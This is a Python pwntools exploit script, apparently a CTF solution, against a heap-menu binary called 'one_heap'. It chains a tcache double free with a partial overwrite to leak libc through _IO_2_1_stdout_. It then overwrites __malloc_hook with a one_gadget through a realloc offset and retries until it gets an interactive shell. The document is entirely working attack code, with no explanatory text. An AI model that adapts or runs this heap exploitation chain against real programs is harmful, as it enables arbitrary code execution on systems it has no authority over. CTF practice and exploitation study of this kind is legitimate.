#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
# context.log_level = "debug"
while True:
    try:
        if debug == 1:
            p = process('./one_heap')
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        else:
            p = remote('', )
            libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
        elf = ELF('./one_heap', checksec=False)
        libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


        def new(new_size, new_content):
            p.sendlineafter('Your choice:', '1')
            p.sendlineafter('Input the size:', str(new_size))
            p.sendafter('Input the content:', new_content)


        def free():
            p.sendlineafter('Your choice:', '2')


        new(0x7f, '\n')
        free()
        free()
        pd = 'a' * 0x20
        pd += p64(0x90) + p64(0x30)
        new(0x50, pd + '\n')
        free()
        new(0x7f, '\n')
        new(0x7f, '\n')
        new(0x7f, '\n')
        free()
        new(0x40, p16(0x1750) + '\n')
        pd = 'a' * 0x40
        pd += p64(0) + p64(0x91)
        new(0x7f, pd + '\n')
        pd = p64(0) * 2
        pd += p64(0xfbad1887)
        pd += p64(0) * 3
        pd += '\x00'
        new(0x7f, pd + '\n')
        p.recv(0x88)

        addr__IO_2_1_stdout_ = u64(p.recv(6).ljust(8, '\x00')) - 131
        libcbase = addr__IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
        addr___malloc_hook = libcbase + libc.sym['__malloc_hook']
        addr___libc_realloc = libcbase + libc.sym['__libc_realloc']
        addr_one_gadget = libcbase + libc_one_gadget[0]

        if addr__IO_2_1_stdout_ & 0xff != 96:
            p.close()
            continue
        else:
            pause()

        pd = '\x00' * 0x30
        pd += p64(0x40) + p64(0x60)
        pd += p64(addr___malloc_hook - 8)
        new(0x7f, pd + '\n')
        new(0x50, '\n')
        new(0x50, p64(addr_one_gadget) + p64(addr___libc_realloc + 2) + '\n')
        p.sendlineafter('Your choice:', '1')
        p.sendlineafter('Input the size:', str(0x30))
        p.recvuntil('Input the content:', timeout=1)

        success('addr__IO_2_1_stdout_ = ' + hex(addr__IO_2_1_stdout_))
        success('addr_one_gadget      = ' + hex(addr_one_gadget))
        success('addr___malloc_hook   = ' + hex(addr___malloc_hook))
        # gdb.attach(p, "b *$rebase(0xD2B)\nc")
    except:
        p.close()
        continue
    else:
        p.interactive()
        p.close()
        break
